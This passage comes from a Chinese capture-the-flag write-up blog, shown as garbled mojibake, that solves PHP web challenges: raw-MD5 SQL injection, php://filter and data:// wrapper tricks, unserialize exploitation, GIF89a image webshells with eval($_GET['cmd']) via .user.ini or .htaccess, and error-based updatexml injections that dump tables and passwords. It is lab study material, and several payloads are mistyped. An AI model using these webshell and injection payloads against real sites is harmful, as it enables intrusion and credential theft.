class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å¼±æ¯”è¾ƒ"><a href="#å¼±æ¯”è¾ƒ" class="headerlink" title="å¼±æ¯”è¾ƒ"></a>å¼±æ¯”è¾ƒ</h2><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php å¼±ç±»å‹æ€»ç»“ - Mrsm1th - åšå®¢å›­ (cnblogs.com)</a></p>
<h1 id="å¼±ç±»å‹"><a href="#å¼±ç±»å‹" class="headerlink" title="å¼±ç±»å‹"></a>å¼±ç±»å‹</h1><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php å¼±ç±»å‹æ€»ç»“ - Mrsm1th - åšå®¢å›­ (cnblogs.com)</a></p>
<p>æ•°å­—å¤ªé•¿ç»•è¿‡æ–¹å¼æœ‰ï¼š</p>
<p>money[]=1</p>
<p>ç§‘å­¦æ•°å­—è®¡æ•°æ³•</p>
<h1 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h1><p>æ‰“å¼€ååªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®ï¼Œè€ƒç‚¹ä¸åº”è¯¥æ˜¯sqlæ³¨å…¥ï¼Œä½†è¿˜æ˜¯å°è¯•äº†ä¸€ä¸‹ï¼Œæœç„¶ä¸æ˜¯ã€‚</p>
<p>ç„¶åçœ‹äº†wpï¼ŒæŠ“åŒ…ä¹‹åå‘åŒ…ï¼Œå¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>



<p>ç„¶åç½‘ä¸Šæœåˆ°md5($pass,true)çš„æ¼æ´ï¼Œå¾—çŸ¥ffifdyopï¼ŒÂ·åœ¨æœ¬åœ°ç¯å¢ƒè¯•éªŒffifdyopï¼Œè¾“å‡ºçš„å¼€å¤´æ˜¯â€™orâ€™6xxxxxx<br>åœ¨æ•°æ®åº“è¯­å¥é‡Œå°±æ„æˆäº†select * from â€˜adminâ€™ where password= â€˜â€™orâ€™6xxxxxx â€™ ç›¸å½“äº password= â€˜â€™ or 1 å˜æˆæ°¸çœŸï¼Œ</p>
<p>åé¢åªè¦æ˜¯æ•°å­—ï¼Œå°±å¯ä»¥ä½¿ä»–æ°¸è¿œä¸ºçœŸã€‚åé¢ï¼ŒMD5ç»•è¿‡å³å¯</p>
<h1 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠä¸‰ä¸ªå‚æ•°ï¼Œtext,file,password</p>
<p>å…¶ä¸­textçš„å†…å®¹ä¸ºwelcome to the zjctfï¼Œå¯ä»¥åˆ©ç”¨ä¼ªåè®®data://ï¼Œ ç”¨æˆ·å†™å…¥çš„æ•°æ®ä½œä¸ºè¾“å…¥æµ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>

<p>è®¿é—®useless.phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå‘ç°è¯»ä¸å‡ºæ¥ï¼Œç„¶åå°è¯•ä½¿ç”¨ä¼ªåè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$password</span>=<span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ä¸ç†è§£å‚æ•°ä¸ºä»€è«è¦ä¼ å…¥åˆ°æœ€ä¸Šé¢ï¼Œè€Œä¸æ˜¯åœ¨$password=new Flag();ä¸­ï¼Œä¼ å…¥å‚æ•°</p>
<h2 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h2><p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(43æ¡æ¶ˆæ¯) PHPä¼ªåè®®è¯¦è§£_cosmoslinçš„åšå®¢-CSDNåšå®¢_php ä¼ªåè®®è¯¦è§£</a></p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload-1-æ–‡ä»¶ä¸Šä¼ "><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload-1-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload 1(æ–‡ä»¶ä¸Šä¼ )"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload 1(æ–‡ä»¶ä¸Šä¼ )</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨GIF89a &lt;script language=</span><br></pre></td></tr></table></figure>

<h1 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h1><p>ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½†æ˜¯æç¤ºåç¼€åé”™è¯¯ã€‚äºæ˜¯ä¸Šä¼ .jpgç±»å‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯åˆæç¤º&lt;?ä¸å…è®¸ï¼Œäºæ˜¯ä¸Šä¼ å†…å®¹ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;s lnguage=&quot;php&quot;&gt;eval($_GT[1]);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åˆæç¤ºexif_imagetype:not image!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exif_imagetype</span><br><span class="line">(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">exif_imagetype â€” åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹</span><br><span class="line"></span><br><span class="line">è¯´æ˜</span><br><span class="line">exif_imagetype ( string $filename ) : int</span><br><span class="line"></span><br><span class="line">exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯´æ˜åç«¯ä¼šæˆªå–æ–‡ä»¶å†…å®¹çš„ä¸€éƒ¨åˆ†è¿›è¡Œåˆ¤æ–­</p>
<p>å› æ­¤å¯ä»¥é‡‡ç”¨<strong>GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—ï¼Œ</strong></p>
<p>äºæ˜¯ä¸Šä¼ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script la</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eal($_GET[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯å›¾ç‰‡é©¬ï¼Œä¸æ˜¯phpè„šæœ¬æ–‡ä»¶ï¼Œæ— æ³•è¢«è§£æè¿è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°ç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå‘å…¶ä¸­å†™å…¥å†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­å†åŒ…å«æ–‡ä»¶ã€‚æ‰§è¡Œæœ¨é©¬ã€‚</p>
<p>1.ä¸Šä¼ user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">ato_prepend_file=</span><br></pre></td></tr></table></figure>

<p>2.ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæ–‡ä»¶åä¸º1.jpg</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">æŠ¥è¡¨å</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(informatio</span><br><span class="line">n_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">çˆ†åˆ—å</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(informati</span><br><span class="line">on_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">å¯†ç </span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),</span><br><span class="line">1))or&#x27;1&amp;password=1</span><br><span class="line">?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),</span><br><span class="line">1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL1-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL1</h1><p>ä¸Šä¼ å›¾ç‰‡æœ¨é©¬æˆåŠŸï¼ŒæŠ“åŒ…ä¹‹åï¼Œä¿®æ”¹ä¸ºphtml,php5,PHpéƒ½ä¸å¯ä»¥ï¼Œé‡åˆ°è¿™ç§æƒ…å†µæœ‰ä¸¤ç§è§£å†³åŠæ³•</p>
<p>1.ä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œåœ¨ä¸Šä¼ æ‰€åŒ…å«çš„æ–‡ä»¶ä¸ºå›¾ç‰‡é©¬ï¼Œåˆ©ç”¨var_dump</p>
<p>ä½†æ˜¯å‰æå¿…é¡»æ˜¯æœ‰å¯ä»¥åˆ©ç”¨çš„phpæ–‡ä»¶</p>
<p>2.å…ˆä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶åä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå†…å®¹ä¸ºSetHandler application/x-httpd-phpï¼Œä½œç”¨æ˜¯å°†æ‰€æœ‰çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶æ¥è§£æ</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/HelloCTF/p/12987570.html">.user.iniå’Œ.htaccess - Hel10 - åšå®¢å›­ (cnblogs.com)</a></p>
<h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹éœ€è¦è¾“å…¥å‚æ•°éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†åºåˆ—åŒ–çš„ç»“æœä¼ å…¥ç»™str,is_validè¿›è¡Œäº†è¿‡æ»¤</p>
<p>unserialize()é¦–å…ˆè§¦å‘çš„æ˜¯destruct(),æ¥ä¸‹æ¥è§¦å‘çš„æ˜¯construct()</p>
<p>æˆ‘ä»¬è¦è¯»æ–‡ç« ï¼Œå› æ­¤å¯ä»¥å¿½ç•¥å†™æ–‡ç« ï¼Œé‡ç‚¹åˆ†æä¸‹é¢å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;		<span class="comment">//æˆ‘ä»¬éœ€è¦è®©opçš„å€¼ä¸º2ï¼Œè¿›è¡Œè¯»æ–‡ä»¶æ“ä½œ</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;	<span class="comment">//å¼±ç±»å‹æ¯”è¾ƒ</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();	<span class="comment">//è¯»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);	<span class="comment">//è¾“å‡ºæ–‡ä»¶</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;	<span class="comment">//è®©filenameçš„å€¼ä¸ºflag.phpï¼Œå°±å¯ä»¥ç›´æ¥è¯»å–åˆ°flagäº†ï¼Œ</span></span><br><span class="line">    <span class="comment">//ä¹Ÿå¯ä»¥ä½¿ç”¨ä¼ªåè®®php://filter:read=convert.base64-encode/resource=flag.phpè¯»å–flagæ–‡ä»¶</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;		<span class="comment">//å¯¹opçš„å€¼è¿›è¡Œå¼ºç±»å‹åˆ¤æ–­ï¼Œè¿™ä¸ªåœ°æ–¹å¯ä»¥ç”¨op = int 2 ç»•è¿‡ï¼Œå› ä¸ºä¸Šé¢æ˜¯å¼±ç±»å‹è¿›è¡Œæ¯”è¾ƒçš„</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//å¼ºæ¯”è¾ƒï¼Œè¿™ä¸€æ­¥çš„å¼ºæ¯”è¾ƒå¯ä»¥ä¸æ­£ç¡®ï¼Œå› ä¸ºä¸Šä¸€æ­¥å¼±æ¯”è¾ƒæˆåŠŸè¿‡äº†</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;		<span class="comment">//æˆ‘ä»¬ä¸å†™æ–‡ä»¶ï¼Œæ‰€ä»¥è·Ÿcontentæ²¡æœ‰ä»€ä¹ˆå…³ç³»</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();			<span class="comment">//è°ƒç”¨process</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
